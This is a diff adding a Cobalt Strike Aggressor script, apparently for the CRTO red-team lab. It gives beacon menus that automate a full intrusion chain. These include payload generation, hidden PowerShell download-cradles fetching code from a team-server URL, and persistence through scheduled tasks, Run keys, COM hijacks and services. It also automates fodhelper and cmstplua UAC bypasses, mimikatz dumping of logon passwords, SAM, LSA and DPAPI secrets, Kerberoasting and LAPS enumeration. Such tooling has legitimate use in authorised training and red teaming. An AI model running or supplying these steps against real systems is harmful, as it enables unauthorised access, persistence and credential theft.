@@ -1,0 +1,753 @@
+## Helper Functions
+inline print_info {
+   println(formatDate("[HH:mm:ss] ") . "\cE[crto.cna]\o " . $1);
+}
+
+inline print_error {
+   println(formatDate("[HH:mm:ss] ") . "\c4[crto.cna]\o " . $1);
+}
+
+
+## Global Variables
+global('$ip');
+
+#$wait = 1;
+
+$ip = localip();
+					
+popup beacon_bottom
+{
+	menu "CRTO"
+	{
+		item "Initialize"
+		{
+			mkdir(script_resource("Payloads"));
+			mkdir(script_resource("Tools"));
+		}
+		item "Get Flag"
+		{
+			bshell($1, "type C:\\Users\\administrator\\Desktop\\flag*");
+		}
+		menu "Host Reconnaissance"
+		{
+			menu "Seatbelt"
+			{
+				item "Group : user"
+				{
+					binput($1, "Seatbelt.exe -group=user");
+					bexecute_assembly($1, script_resource('Tools/Seatbelt.exe'), " -group=user");
+				}
+				
+				item "Group : system"
+				{
+					binput($1, "Seatbelt.exe -group=system");
+					bexecute_assembly($1, script_resource('Tools/Seatbelt.exe'), " -group=system");
+				
+				}
+				
+				item "Group : remote"
+				{
+					binput($1, "Seatbelt.exe -group=remote");
+					bexecute_assembly($1, script_resource('Tools/Seatbelt.exe'), " -group=remote");
+				}
+				
+				item "Group : misc"
+				{
+					binput($1, "Seatbelt.exe -group=misc");
+					bexecute_assembly($1, script_resource('Tools/Seatbelt.exe'), " -group=misc");
+				}
+			}
+		}
+		menu "Host Persistence"
+		{
+			menu "Task Scheduler"
+			{
+				item "Powershell HTTP x64"
+				{
+					local('$dialog %defaults $script $PScommandBase64');
+					
+					foreach $name (listeners_local()) {
+				    	$listener_name = lc($name);
+				        if ($listener_name hasmatch "http") {
+							$script = artifact_payload($name, "powershell", "x64", "process", "None");
+						}
+					}
+					# host the script!
+					$url = site_host($ip, 80, "/tsp", $script, "text/plain", "Persistence - Task Scheduler - Powershell");
+					# Base64 powershell command + AMSI
+					$PScommandBase64 = transform("IEX ((new-object net.webclient).downloadstring(\"$url_amsi\"));IEX ((new-object net.webclient).downloadstring(\"$url\"))","powershell-base64");
+
+					$ToExec ="-t schtask -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden -enc $PScommandBase64\" -n \"Updater\" -m add -o hourly";
+					binput($1, "execute-assembly SharPersist.exe $ToExec");
+					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+				}
+				item "Exe HTTP x64"
+				{
+					local('$dialog %defaults $data $PScommandBase64');
+					
+					foreach $name (listeners_local()) {
+				    	$listener_name = lc($name);
+				        if ($listener_name hasmatch "http") {
+							$data = artifact_payload($name, "exe", "x64", "process", "None");
+						}
+					}
+					$outfile = getFileProper(script_resource("Payloads"), "http_tsp.exe");
+					$handle = openf("> $outfile");
+					writeb($handle, $data);
+					closef($handle);
+					
+					bcd($1, "c:\\windows\\Temp");
+					bupload($1, $outfile);
+					
+					$ToExec ="-t schtask -c \"C:\\Windows\\Temp\\http_tsp.exe\" -n \"UpdaterBin\" -m add -o hourly";
+					binput($1, "execute-assembly SharPersist.exe $ToExec");
+					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+				}
+			}
+			menu "Startup Folder"
+			{
+				item "Powershell HTTP x64"
+				{
+					local('$dialog %defaults $script $PScommandBase64');
+					
+					foreach $name (listeners_local()) {
+				    	$listener_name = lc($name);
+				        if ($listener_name hasmatch "http") {
+							$script = artifact_payload($name, "powershell", "x64", "process", "None");
+						}
+					}
+					# host the script!
+					$url = site_host($ip, 80, "/sfp", $script, "text/plain", "Persistence - Task Scheduler - Powershell");
+					# Base64 powershell command + AMSI
+					$PScommandBase64 = transform("IEX ((new-object net.webclient).downloadstring(\"$url_amsi\"));IEX ((new-object net.webclient).downloadstring(\"$url\"))","powershell-base64");
+
+					$ToExec ="-t startupfolder -c \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -a \"-nop -w hidden -enc $PScommandBase64\" -m add -f \"UserEnvSetup\"";
+					binput($1, "execute-assembly SharPersist.exe $ToExec");
+					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+				}
+				item "Exe HTTP x64"
+				{
+					local('$dialog %defaults $data');
+					
+					foreach $name (listeners_local()) {
+				    	$listener_name = lc($name);
+				        if ($listener_name hasmatch "http") {
+							$data = artifact_payload($name, "exe", "x64", "process", "None");
+						}
+					}
+					$outfile = getFileProper(script_resource("Payloads"), "http_sfp.exe");
+					$handle = openf("> $outfile");
+					writeb($handle, $data);
+					closef($handle);
+					
+					bcd($1, "c:\\windows\\Temp");
+					bupload($1, $outfile);
+					
+					$ToExec ="-t startupfolder -c \"C:\\Windows\\Temp\\http_sfp.exe\" -m add -f \"UserEnvSetupBin\"";
+					binput($1, "execute-assembly SharPersist.exe $ToExec");
+					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+				}
+			}
+			menu "Registry AutoRun"
+			{
+				item "Exe HTTP x64"
+				{
+					local('$dialog %defaults $data');
+					
+					foreach $name (listeners_local()) {
+				    	$listener_name = lc($name);
+				        if ($listener_name hasmatch "http") {
+							$data = artifact_payload($name, "exe", "x64", "process", "None");
+						}
+					}
+					$outfile = getFileProper(script_resource("Payloads"), "http_arp.exe");
+					$handle = openf("> $outfile");
+					writeb($handle, $data);
+					closef($handle);
+					
+					bcd($1, "c:\\windows\\Temp");
+					bupload($1, $outfile);
+					
+					$ToExec ="-t reg -c \"C:\\Windows\\Temp\\http_arp.exe\" -k \"hkcurun\" -v UpdaterBin -m add";
+					binput($1, "execute-assembly SharPersist.exe $ToExec");
+					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+				}
+			}
+			menu "COM Hijacks"
+			{
+				item "Dll HTTP x64"
+				{
+					local('$dialog %defaults $data');
+					
+					foreach $name (listeners_local()) {
+				    	$listener_name = lc($name);
+				        if ($listener_name hasmatch "http") {
+							$data = artifact_payload($name, "dll", "x64", "thread", "None");
+						}
+					}
+					$outfile = getFileProper(script_resource("Payloads"), "http_com.dll");
+					$handle = openf("> $outfile");
+					writeb($handle, $data);
+					closef($handle);
+					
+					bcd($1, "c:\\windows\\Temp");
+					bupload($1, $outfile);
+					
+					$ToExec ="-t reg -c \"C:\\Windows\\Temp\\http_arp.exe\" -a \"/q /n\" -k \"hkcurun\" -v UpdaterBin -m add";
+					binput($1, "execute-assembly SharPersist.exe $ToExec");
+					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+					bpowerpick($1,"New-Item -Path \"HKCU:Software\\Classes\\CLSID\" -Name \"{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\"");
+					bpowerpick($1,"New-Item -Path \"HKCU:Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\" -Name \"InprocServer32\" -Value \"c:\\windows\\Temp\\http_com.dll\"");
+					bpowerpick($1,"New-ItemProperty -Path \"HKCU:Software\\Classes\\CLSID\\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\\InprocServer32\" -Name \"ThreadingModel\" -Value \"Both\"");
+				}
+			}
+			menu "Services"
+			{
+				item "Svc TCP Bind Local x64"
+				{
+					local('$dialog %defaults $data');
+					
+					foreach $name (listeners_local()) {
+				    	$listener_name = lc($name);
+				        if ($listener_name hasmatch "tcp-local") {
+							$data = artifact_payload($name, "svcexe", "x64", "process", "None");
+						}
+					}
+					$outfile = getFileProper(script_resource("Payloads"), "tcp_svc.exe");
+					$handle = openf("> $outfile");
+					writeb($handle, $data);
+					closef($handle);
+					
+					bcd($1, "c:\\windows\\Temp");
+					bupload($1, $outfile);
+					
+					$ToExec ="-t service -c \"C:\\Windows\\Temp\\tcp_svc.exe\" -n \"legit-svc\" -m add";
+					binput($1, "execute-assembly SharPersist.exe $ToExec");
+					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+				}
+				item "Svc DNS"
+				{
+					local('$dialog %defaults $data');
+					
+					foreach $name (listeners_local()) {
+				    	$listener_name = lc($name);
+				        if ($listener_name hasmatch "dns") {
+							$data = artifact_payload($name, "svcexe", "x64", "process", "None");
+						}
+					}
+					$outfile = getFileProper(script_resource("Payloads"), "tcp_svc.exe");
+					$handle = openf("> $outfile");
+					writeb($handle, $data);
+					closef($handle);
+					
+					bcd($1, "c:\\windows\\Temp");
+					bupload($1, $outfile);
+					
+					$ToExec ="-t service -c \"C:\\Windows\\Temp\\tcp_svc.exe\" -n \"legit-svc\" -m add";
+					binput($1, "execute-assembly SharPersist.exe $ToExec");
+					bexecute_assembly($1, script_resource('Tools/SharPersist.exe'), $ToExec);
+				}
+			}
+		}
+		menu "Privilege Escalation"
+		{
+			item "Unquoted Service Paths"
+			{
+				binput($1, "SharpUp.exe audit UnquotedServicePath");
+				bexecute_assembly($1, script_resource('Tools/SharpUp.exe'), " audit UnquotedServicePath");
+			}
+			item "Weak Service Binary Permissions"
+			{
+				binput($1, "SharpUp.exe audit ModifiableServices");
+				bexecute_assembly($1, script_resource('Tools/SharpUp.exe'), " audit ModifiableServices");
+			}
+			menu "UAC Bypasses"
+			{
+				item "Elevate Kit Bind TCP Local x64"
+				{
+					binput($1, "elevate uac-schtasks tcp-local");
+						
+					foreach $name (listeners_local()) {
+						$listener_name = lc($name);
+						if ($listener_name hasmatch "tcp-local") {							
+							belevate($1, "uac-schtasks", $name);
+						}
+					}
+					bconnect($1, "127.0.0.1",4444);
+				}
+				item "Fodhelper Bind TCP Local x64"
+				{
+					binput($1, "Fodhelper Priv Esc");
+					local('$dialog %defaults $data');
+					
+					foreach $name (listeners_local()) {
+				    	$listener_name = lc($name);
+				        if ($listener_name hasmatch "tcp-local") {
+							$data = artifact_payload($name, "exe", "x64", "process", "None");
+						}
+					}
+					$outfile = getFileProper(script_resource("Payloads"), "tcp_fhuac.exe");
+					$handle = openf("> $outfile");
+					writeb($handle, $data);
+					closef($handle);
+					
+					bcd($1, "c:\\windows\\Temp");
+					bupload($1, $outfile);
+
+					bpowerpick($1,"New-Item \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Force");
+					bpowerpick($1,"New-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"DelegateExecute\" -Value \"\" -Force");
+					bpowerpick($1,"Set-ItemProperty -Path \"HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\" -Name \"(default)\" -Value \"c:\\windows\\Temp\\tcp_fhuac.exe\" -Force");
+					brun($1,"cmd.exe /C \"C:\\Windows\\System32\\fodhelper.exe\"");
+					bconnect($1, "127.0.0.1",4444);
+				}
+				item "runasadmin uac-cmstplua HTTP x64 (from Powershell)"
+				{
+					local('$dialog %defaults $script $PScommandBase64');
+					
+					foreach $name (listeners_local()) {
+				    	$listener_name = lc($name);
+				        if ($listener_name hasmatch "http") {
+							$data = artifact_payload($name, "exe", "x64", "process", "None");
+						}
+					}
+					$outfile = getFileProper(script_resource("Payloads"), "uac.exe");
+					$handle = openf("> $outfile");
+					writeb($handle, $data);
+					closef($handle);
+					
+					bcd($1, "c:\\windows\\Tasks");
+					bupload($1, $outfile);
+					
+					binput($1, "runasadmin uac-cmstplua C:\\Windows\\Tasks\\uac.exe");
+					belevate_command($1, "uac-cmstplua", "C:\\Windows\\Tasks\\uac.exe");
+				}
+			}
+		}
+		menu "Credentials"
+        {
+            item "Lsa secret"
+            {
+                bmimikatz($1, "token::elevate; lsadump::secrets");
+            }
+           
+            item "logonpassword"
+            {
+                bmimikatz($1, "token::elevate; sekurlsa::logonpasswords");
+            }
+
+            item "SAM dump"
+            {
+                bmimikatz($1, "token::elevate; lsadump::sam");
+            }
+
+			item "Kerberos Encryption Keys"
+			{
+                bmimikatz($1, "token::elevate; sekurlsa::ekeys");
+			}
+
+			item "Domain Cached Credentials"
+			{
+                bmimikatz($1, "token::elevate; lsadump::cache");
+			}
+			
+            item "Kerberos Tickets list"
+            {
+                bexecute_assembly($1, script_resource('Tools/Rubeus.exe'), "triage");
+            }
+
+            item "Wifi password"
+            {
+                bexecute_assembly($1, script_resource('Tools/SharpWifiDump.exe'), " ");
+            }
+
+            item "Password in registry (Machine)"
+            {
+                bpowerpick($1, "reg query HKLM /f password /t REG_SZ /s");
+            }
+
+            item "Password in registry (User)"
+            {
+                bpowerpick($1, "reg query HKLM /f password /t REG_SZ /s");
+            }
+
+            item "SharpWeb"
+            {
+                bexecute_assembly($1, script_resource('Tools/SharpWeb.exe'), " all");
+            }
+        }
+        menu "Domain Reconnaissance"
+	    {
+	        item "Domain information"
+	        {
+			    bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-Domain');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "Domain Controller"
+	        {
+			    bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainController');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "Trust information"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainTrust');
+	            bpowershell_import_clear($1);
+	
+	        }
+	
+	        item "User list"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainUser -Properties DisplayName, MemberOf | fl');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "Computer list"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainComputer -Properties DnsHostName | sort -Property DnsHostName');
+	            bpowershell_import_clear($1);
+	        }
+	
+	
+	        item "Group list"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainGroup | where Name -like "*Admins*" | select SamAccountName');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "GPO list"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainGPO -Properties DisplayName | sort -Property DisplayName');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "GPO Local Group"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainGPOLocalGroup | select GPODisplayName, GroupName');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "GPO with modification rights"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' $sid=Get-DomainSID ; Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match $sid+"-[\d]{4,10}" }');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "OU list"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainOU -Properties Name | sort -Property Name');
+	            bpowershell_import_clear($1);
+	        }
+	
+	
+	        item "MSSQL Local Instance"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerUpSQL.ps1"));
+	            bpowerpick($1, ' Get-SQLInstanceLocal -Verbose');
+	            bpowershell_import_clear($1);
+	
+	        }
+	
+	
+	        item "MSSQL Domain Instance"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerUpSQL.ps1"));
+	            bpowerpick($1, ' Get-SQLInstanceDomain -Verbose');
+	            bpowershell_import_clear($1);
+	
+	        }
+	
+	        item "Kerberoastable user"
+	        {
+	            bexecute_assembly($1, script_resource('Tools/Rubeus.exe'), "kerberoast /nowrap");
+	        }
+	
+	        item "Asreprostable user"
+	        {
+	            bexecute_assembly($1, script_resource('Tools/Rubeus.exe'), "asreproast /nowrap");
+	        }
+	
+	        item "Logged on"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainComputer | Get-NetLoggedon');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "Net session"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainComputer | Get-NetSession');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "RDP Session"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainComputer | Get-NetRDPSession');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "DFS Share"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainDFSShare');
+	            bpowershell_import_clear($1);
+	
+	        }
+	
+	        item "Net share"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainComputer | Get-NetShare');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "Share finder"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, 'Find-DomainShare -CheckShareAccess');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "Search *.doc*, *.xls*, *.csv, *.ppt* in shares"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, 'Find-InterestingDomainShareFile -Include *.doc*, *.xls*, *.csv, *.ppt*');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "Search Unconstrained deleguation"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainComputer -UnConstrained | select samaccountname, dnshostname');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "Search deleguation (user)"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "Search deleguation (computer)"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "DNS Record"
+	        {
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+	            bpowerpick($1, ' Get-DomainDNSZone | Get-DomainDNSRecord | select name');
+	            bpowershell_import_clear($1);
+	        }
+	
+	        item "Run SharpHound"
+	        {
+	            bexecute_assembly($1, script_resource('Tools/SharpHound.exe'), "-c All,GPOLocalGroup");
+	        }
+		}
+		menu "DPAPI"
+	    {
+	        item "Credential Manager"
+	        {
+				binput($1, "Seatbelt.exe WindowsCredentialFiles");
+				bexecute_assembly($1, script_resource('Tools/Seatbelt.exe'), "WindowsCredentialFiles");
+	        }
+	        item "Get Master Key cached (admin)"
+	        {
+				binput($1, "mimikatz !sekurlsa::dpapi");
+                bmimikatz($1, "!sekurlsa::dpapi");
+	        }
+			item "List Master keys files"
+			{
+				bpowerpick($1, "gci -hidden \$env:appdata/Microsoft/Protect/S-*/*-*-*-*-*,\$env:localappdata/Microsoft/Protect/S-*/*-*-*-*-*", '', '', &result_ps);
+			}
+			item "List Credentials files"
+			{
+				bpowerpick($1, "gci -hidden \$env:appdata/Microsoft/Credentials,\$env:localappdata/Microsoft/Credentials", '', '', &result_ps);
+			}
+			item "Decrypt current user Credentials"
+			{
+				bpowerpick($1, "gci -hidden \$env:appdata/Microsoft/Credentials,\$env:localappdata/Microsoft/Credentials \| foreach \{\$_.FullName\}", '', '', &result_get_creds);
+			}
+			item "Decrypt Scheduled Task Credentials (admin)"
+			{
+				bpowerpick($1, "gci -hidden C:/Windows/System32/config/systemprofile/AppData/Local/Microsoft/Credentials \| foreach \{\$_.FullName\}", '', '', &result_get_task_creds);
+			}
+		}
+		menu "ADCS"
+	    {
+	        item "Finding Certificate Authorities"
+	        {
+				binput($1, "Certify.exe cas");
+				bexecute_assembly($1, script_resource('Tools/Certify.exe'), "cas");
+	        }
+	        item "Misconfigured Certificate Templates"
+	        {
+				binput($1, "Certify.exe find /vulnerable");
+				bexecute_assembly($1, script_resource('Tools/Certify.exe'), "find /vulnerable");
+	        }
+		}
+		menu "Microsoft Configuration Manager"
+	    {
+	        item "Finding SCCM Servers (SharpSCCM)"
+	        {
+				binput($1, "SharpSCCM.exe local site-info --no-banner");
+				bexecute_assembly($1, script_resource('Tools/SharpSCCM.exe'), "local site-info --no-banner");
+	        }
+	        item "Finding SCCM Servers (WMI)"
+	        {
+				binput($1, "Get-WmiObject -Class SMS_Authority -Namespace root\\CCM | select Name, CurrentManagementPoint | fl");
+				bpowerpick($1, "Get-WmiObject -Class SMS_Authority -Namespace root\\CCM | select Name, CurrentManagementPoint | fl");
+	        }
+	        item "NAC Credentials (admin)"
+	        {
+				binput($1, "SharpSCCM.exe local naa -m wmi --no-banner");
+				bexecute_assembly($1, script_resource('Tools/SharpSCCM.exe'), "local naa -m wmi --no-banner");
+	        }
+	        item "Get SCCM Collections for current user"
+	        {
+				binput($1, "SharpSCCM.exe get collections --no-banner");
+				bexecute_assembly($1, script_resource('Tools/SharpSCCM.exe'), "get collections --no-banner");
+	        }
+	        item "Get SCCM User rights"
+	        {
+				binput($1, "SharpSCCM.exe get class-instances SMS_Admin --no-banner");
+				bexecute_assembly($1, script_resource('Tools/SharpSCCM.exe'), "get class-instances SMS_Admin --no-banner");
+	        }
+		}
+		menu "LAPS"
+	    {
+	        item "Check if AdmPwd.dll exists in local computer"
+	        {
+				binput($1, "ls C:\\Program Files\\LAPS\\CSE");
+				bls($1, "C:\\Program Files\\LAPS\\CSE");
+	        }
+	        item "Search GPO with LAPS in name"
+	        {
+				binput($1, "Get-DomainGPO | ? { \$_.DisplayName -like \"*laps*\" } | select DisplayName, Name, GPCFileSysPath | fl");
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+				bpowerpick($1, "Get-DomainGPO | ? { \$_.DisplayName -like \"*laps*\" } | select DisplayName, Name, GPCFileSysPath | fl");
+	            bpowershell_import_clear($1);
+	        }
+	        item "List computer with ms-Mcs-AdmPwdExpirationTime not null"
+	        {
+				binput($1, "Get-DomainComputer | ? { \$_.\"ms-Mcs-AdmPwdExpirationTime\" -ne \$null } | select dnsHostName");
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+				bpowerpick($1, "Get-DomainComputer | ? { \$_.\"ms-Mcs-AdmPwdExpirationTime\" -ne \$null } | select dnsHostName");
+	            bpowershell_import_clear($1);
+	        }
+	        item "List who is allowed to read LAPS password (PowerView)"
+	        {
+				binput($1, "Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { \$_.ObjectAceType -eq \"ms-Mcs-AdmPwd\" -and \$_.ActiveDirectoryRights -match \"ReadProperty\" } | select ObjectDn, SecurityIdentifier | fl");
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+				bpowerpick($1, "Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { \$_.ObjectAceType -eq \"ms-Mcs-AdmPwd\" -and \$_.ActiveDirectoryRights -match \"ReadProperty\" } | select ObjectDn, SecurityIdentifier | fl");
+	            bpowershell_import_clear($1);
+	        }
+	        item "List who is allowed to read LAPS password (LAPSToolkit)"
+	        {
+				binput($1, "Find-LAPSDelegatedGroups");
+	            bpowershell_import($1, script_resource("Tools/LAPSToolkit.ps1"));
+	            bpowerpick($1, 'Find-LAPSDelegatedGroups');
+	            bpowershell_import_clear($1);
+	        }
+		}
+		menu "AppLocker"
+	    {
+	        item "Search GPO with AppLocker in name"
+	        {
+				binput($1, "Get-DomainGPO -Domain dev-studio.com | ? { \$_.DisplayName -like \"*AppLocker*\" } | select displayname, gpcfilesyspath");
+	            bpowershell_import($1, script_resource("Tools/PowerView.ps1"));
+				bpowerpick($1, "Get-DomainGPO -Domain dev-studio.com | ? { \$_.DisplayName -like \"*AppLocker*\" } | select displayname, gpcfilesyspath");
+	            bpowershell_import_clear($1);
+	        }
+		}
+	}
+}
+
+## Generate Payload
+sub generate_my_payload {					
+	$outfile = getFileProper(script_resource("Payloads"), $2);
+	$handle = openf("> $outfile");
+	writeb($handle, $1);
+	closef($handle);
+}
+
+## DPAPI functions
+## SYSTEM
+sub result_get_task_creds {
+	local('$cmd $cred $out')
+	binput($1, 'Powerpick executed');
+	foreach $cred (split('\r\n', $2))
+	{
+		$cmd = "!sekurlsa::dpapi;dpapi::cred /in:" . $cred;
+		bmimikatz($1, $cmd, $null, $null,&write_in_file_task_dpapi);
+	}
+}
+
+sub write_in_file_task_dpapi {
+	binput($1, "Full Credentials wrote in c:/windows/temp/dpapi_task.txt");
+	$out = openf(">>" . "c:/windows/temp/dpapi_task.txt");
+	writeb($out, $2);
+	closef($out);
+}
+
+## User
+sub result_get_creds {
+	local('$cmd $cred $out')
+	binput($1, 'Powerpick executed');
+	foreach $cred (split('\r\n', $2))
+	{
+		$cmd = "dpapi::cred /in:" . $cred;
+		bmimikatz($1, $cmd, $null, $null, lambda({ result_get_masterkey ($1, $2, $3, $cred); }, \$cred));
+	}
+}
+
+sub result_get_masterkey {
+	local('$mk $cred');
+	binput($1, "Mimikatz Executed");
+	$cred = $4;
+	$mk = matches($2, 'guidMasterKey[^\{]+\{([^\}]+)\}')[0];
+	bpowerpick($1, "gci -hidden -ErrorAction \"silentlycontinue\" \$env:appdata/Microsoft/Protect/S-*/*-*-*-*-*,\$env:localappdata/Microsoft/Protect/S-*/*-*-*-*-* \| foreach \{\$_.FullName\} \| findstr " . $mk, '', '', lambda({ result_get_mk ($1, $2, $3, $cred); }, \$cred));
+}
+
+sub result_get_mk {
+	local('$mk $cred');
+	$mk = split('\r\n', $2)[0];
+	$cred = $4;
+	bmimikatz($1, "dpapi::masterkey /in:" . $mk . " /rpc;dpapi::cred /in:" . $cred, $null, $null, &write_in_file_dpapi);
+}
+
+sub write_in_file_dpapi {
+	binput($1, "Full Credentials wrote in c:/windows/temp/dpapi.txt");
+	$out = openf(">>" . "c:/windows/temp/dpapi.txt");
+	writeb($out, $2);
+	closef($out);
+}
+
+# Handle DNS beacon
+on beacon_initial_empty {
+   binput($1, "[Acting on new DNS Beacon]");
+ 
+   # change the data channel to DNS TXT
+   bmode($1, "dns-txt");
+ 
+   # request the Beacon checkin and send its metadata
+   bcheckin($1);
+}
+
+print_info("CRTO CNA loaded");
